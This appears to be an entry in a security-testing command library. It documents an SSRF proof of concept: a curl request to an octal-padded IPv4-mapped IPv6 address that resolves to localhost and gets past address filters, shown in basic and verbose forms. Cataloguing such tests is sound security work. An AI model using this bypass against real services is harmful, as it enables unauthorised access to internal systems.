---
id: 123e4567-e89b-12d3-a456-426614174002
name: curl-ssrf-poc-with-octal-ipv6
type: command
executor: bash
data: 'curl http://[::ffff:0127.000.0.1]/'
output: FindVuln
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:54.947Z'
platforms:
  - Linux
  - macOS
tags:
  - ssrf
  - poc
verified: false
validated: true
submitted: true
---

# curl-ssrf-poc-with-octal-ipv6

## Command

```bash
curl http://[::ffff:0127.000.0.1]/
```

## Description

Executes a curl request to a malformed IPv4-mapped IPv6 address with octal padding, demonstrating SSRF by resolving to localhost and fetching content from a local server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | http://[::ffff:0127.000.0.1]/ (IPv6 literal with octal IPv4 part) | Yes |

## Examples

### Basic Usage

```bash
curl http://[::ffff:0127.000.0.1]/
```

### Advanced Usage

```bash
curl -v http://[::ffff:0127.000.0.1]/
```

## Expected Output

Returns 'FindVuln' from the local server, confirming connection to 127.0.0.1 despite the invalid format.

## Related

- [[commands/curl-verbose-ipv6-test]]
- [[procedures/Demonstrate-Curl-SSRF-with-Octal-IPv6]]
